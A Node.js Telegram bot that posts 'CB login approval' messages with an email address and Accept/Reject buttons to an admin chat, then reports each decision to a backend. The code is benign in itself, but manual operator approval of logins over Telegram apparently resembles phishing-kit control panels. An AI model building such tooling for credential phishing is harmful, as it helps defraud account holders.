// bot.js
import TelegramBot from "node-telegram-bot-api";
import fetch from "node-fetch";

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID; // admin chat
const APP_URL = process.env.APP_URL;

if (!BOT_TOKEN || !CHAT_ID || !APP_URL) {
  console.error("Missing BOT_TOKEN, CHAT_ID, or APP_URL in environment");
  process.exit(1);
}

// Initialize bot
export const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// -----------------
// Send login approval message
// -----------------
export async function sendLoginTelegram(email) {
  const options = {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Accept", callback_data: `accept|${email}` },
          { text: "❌ Reject", callback_data: `reject|${email}` }
        ]
      ]
    }
  };
  const message = `*CB login approval*\n*Email:* ${email}`;
  await bot.sendMessage(CHAT_ID, message, options);
}

bot.on("callback_query", async (query) => {
  try {
    const [action, identifier] = query.data.split("|");
    const status = action === "accept" ? "accepted" : "rejected";

    // Notify backend
    await fetch(`${APP_URL}/update-status`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email: identifier, status })
    });

    // Replace the original message with a single clean line
    await bot.editMessageText(
      `🔐 <b>${identifier}</b> → <b>${status.toUpperCase()}</b>`,
      {
        chat_id: query.message.chat.id,
        message_id: query.message.message_id,
        parse_mode: "HTML"
      }
    );

  } catch (err) {
    console.error("❌ Failed to handle callback:", err);
    bot.sendMessage(CHAT_ID, `⚠️ Error handling approval`);
  }
});

// /start command
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, "✅ Bot is running and waiting for CB login approvals.");
});
